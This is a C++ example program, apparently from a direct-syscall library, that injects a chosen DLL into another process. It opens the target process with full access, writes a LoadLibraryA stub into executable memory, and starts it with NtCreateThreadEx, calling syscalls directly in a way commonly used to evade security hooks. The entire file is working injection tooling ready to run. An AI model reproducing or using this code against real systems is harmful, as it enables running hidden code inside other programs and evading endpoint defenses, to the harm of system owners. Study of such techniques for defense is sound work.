/*
 * Process Injector Example
 * Demonstrates DLL injection using only syscalls
 */

#include "../syscalls.h"
#include <stdio.h>

DWORD WINAPI LoadLibraryStub(PVOID parameter) {
    typedef HMODULE(WINAPI* LoadLibraryAFunc)(LPCSTR);
    
    struct LoaderData {
        LoadLibraryAFunc fnLoadLibraryA;
        char dllPath[MAX_PATH];
    };

    LoaderData* data = (LoaderData*)parameter;
    return (DWORD)data->fnLoadLibraryA(data->dllPath);
}

bool InjectDLL(DWORD processId, const char* dllPath) {
    printf("[*] Injecting DLL into PID: %d\n", processId);

    // Open process
    OBJECT_ATTRIBUTES objAttr = { 0 };
    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)processId;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    HANDLE hProcess = nullptr;
    NTSTATUS status = g_Syscalls->NtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        &clientId
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to open process (0x%X)\n", status);
        return false;
    }
    printf("[+] Process opened\n");

    // Allocate memory for loader data
    PVOID loaderDataAddr = nullptr;
    SIZE_T loaderDataSize = 0x1000;
    status = g_Syscalls->NtAllocateVirtualMemory(
        hProcess,
        &loaderDataAddr,
        0,
        &loaderDataSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to allocate memory (0x%X)\n", status);
        g_Syscalls->NtClose(hProcess);
        return false;
    }
    printf("[+] Allocated memory at: 0x%p\n", loaderDataAddr);

    // Prepare loader data
    struct LoaderData {
        PVOID fnLoadLibraryA;
        char dllPath[MAX_PATH];
    } loaderData;

    loaderData.fnLoadLibraryA = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    strcpy_s(loaderData.dllPath, dllPath);

    // Write loader data
    SIZE_T written = 0;
    status = g_Syscalls->NtWriteVirtualMemory(
        hProcess,
        loaderDataAddr,
        &loaderData,
        sizeof(loaderData),
        &written
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to write loader data (0x%X)\n", status);
        g_Syscalls->NtClose(hProcess);
        return false;
    }
    printf("[+] Loader data written\n");

    // Allocate memory for stub
    PVOID stubAddr = nullptr;
    SIZE_T stubSize = 0x1000;
    status = g_Syscalls->NtAllocateVirtualMemory(
        hProcess,
        &stubAddr,
        0,
        &stubSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to allocate stub memory (0x%X)\n", status);
        g_Syscalls->NtClose(hProcess);
        return false;
    }
    printf("[+] Stub allocated at: 0x%p\n", stubAddr);

    // Write stub
    status = g_Syscalls->NtWriteVirtualMemory(
        hProcess,
        stubAddr,
        (PVOID)&LoadLibraryStub,
        stubSize,
        &written
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to write stub (0x%X)\n", status);
        g_Syscalls->NtClose(hProcess);
        return false;
    }
    printf("[+] Stub written\n");

    // Create remote thread
    HANDLE hThread = nullptr;
    status = g_Syscalls->NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hProcess,
        stubAddr,
        loaderDataAddr,
        0,
        0,
        0,
        0,
        nullptr
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create thread (0x%X)\n", status);
        g_Syscalls->NtClose(hProcess);
        return false;
    }
    printf("[+] Thread created\n");

    // Wait for thread
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Injection complete\n");

    g_Syscalls->NtClose(hThread);
    g_Syscalls->NtClose(hProcess);

    return true;
}

int main(int argc, char* argv[]) {
    printf("\n[*] Process Injector Example\n\n");

    if (argc < 3) {
        printf("Usage: %s <PID> <DLL_PATH>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    // Initialize syscall library
    g_Syscalls = new SyscallLibrary();
    if (!g_Syscalls->Initialize()) {
        printf("[-] Failed to initialize\n");
        return 1;
    }

    // Inject DLL
    if (InjectDLL(pid, dllPath)) {
        printf("\n[+] Success!\n");
    } else {
        printf("\n[-] Failed!\n");
    }

    delete g_Syscalls;
    return 0;
}
